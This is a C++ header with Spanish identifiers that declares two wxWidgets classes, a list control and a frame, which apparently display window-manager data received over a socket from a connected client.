#ifndef __PANEL_WM
#define __PANEL_WM 1

#include "headers.hpp"


class ListWmManager : public wxListCtrl {
	public:

		ListWmManager(wxWindow* parent, const wxWindowID id,
			const wxPoint& pos, const wxSize& size, long style)
			: wxListCtrl(parent, id, pos, size, style) {}

		SOCKET sckCliente = INVALID_SOCKET;

		void AgregarData(const std::string& strBuffer);
	private:

		void OnWMmessage(wxCommandEvent& event);

		void ShowContextMenu(const wxPoint& pos, bool isEmpty);
		void OnContextMenu(wxContextMenuEvent& event);


		wxDECLARE_EVENT_TABLE();
};

class panelWManager : public wxFrame {
	public:
		panelWManager(wxWindow* pParent, SOCKET sckCliente, std::string strID);

		void AgregarData(const std::string& strBuffer);
	private:
		ListWmManager* listManager = nullptr;

		void m_CrearListView();


		SOCKET sckCliente = INVALID_SOCKET;
};

#endif
